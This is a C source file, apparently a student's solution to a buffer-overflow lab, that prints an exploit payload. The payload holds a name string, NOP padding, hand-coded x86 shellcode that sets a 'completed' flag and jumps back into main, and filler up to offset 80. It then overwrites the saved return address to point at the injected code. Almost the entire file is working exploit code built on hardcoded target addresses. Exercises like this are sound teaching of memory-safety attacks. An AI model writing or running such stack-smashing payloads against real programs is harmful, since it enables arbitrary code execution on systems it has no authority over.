#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void) {

    const char *name = "(Your Name)";

    //Target Addresses (objdump)
    const unsigned int NAME_ADDR = 0x0804a080; //start of name buffer
    const unsigned int RETURN_TO_MAIN = 0x080485dd; //address in main after readString
    const unsigned int COMPLETED_ADDR = 0x0804a044; //address of completed var

    // Offsets 
    const int SHELL_OFF = 16;
    const unsigned int SHELL_ADDR = NAME_ADDR + SHELL_OFF; //0x0804a090 (inj shellcode)
    const int RET_OFFSET = 80; // Distance to saved eip


       //Jumps directly back to main (avoiding stack corruption issues shellcode (15 bytes)
    
    unsigned char shell[] = {
        
        0xb8, 0x44, 0xa0, 0x04, 0x08, //mov $0x804a044, %eax  (Load address of 'completed')
        
        0xc6, 0x00, 0x01, //movb $0x1, (%eax) (Set value to 1)

        0xb8, 0xdd, 0x85, 0x04, 0x08, //mov $0x080485dd, %eax (Load return address in main)

        0xff, 0xe0  // jmp *%eax (Direct jump)
    };

    int i = 0;

    //payload 

    // write Diego
    for (int j = 0; name[j] != '\0'; j++) {
        putchar(name[j]);
        i++;
    }

    //null to stop garbage printig
    putchar(0x00);
    i++;

    //pad with NOPs until offset 16
    while (i < SHELL_OFF) {
        putchar(0x90);
        i++;
    }

    //shellcode injection
    for (int j = 0; j < sizeof(shell); j++) {
        putchar(shell[j]);
        i++;
    }

    //pad rest of buffer (64 bytes)
    while (i < 64) {
        putchar(0x90);
        i++;
    }

    //overflow stack with (up to 80 bytes)
    while (i < RET_OFFSET) {
        putchar('X');
        i++;
    }

    //overwrite return address (eip)
    //point to the shellcode at 0x0804a090
    putchar((SHELL_ADDR) & 0xff);
    putchar((SHELL_ADDR >> 8) & 0xff);
    putchar((SHELL_ADDR >> 16) & 0xff);
    putchar((SHELL_ADDR >> 24) & 0xff);

    //restore the original buffer pointer on the stack
    putchar((NAME_ADDR) & 0xff);
    putchar((NAME_ADDR >> 8) & 0xff);
    putchar((NAME_ADDR >> 16) & 0xff);
    putchar((NAME_ADDR >> 24) & 0xff);

    //end input
    putchar('\n');

    return 0;
}
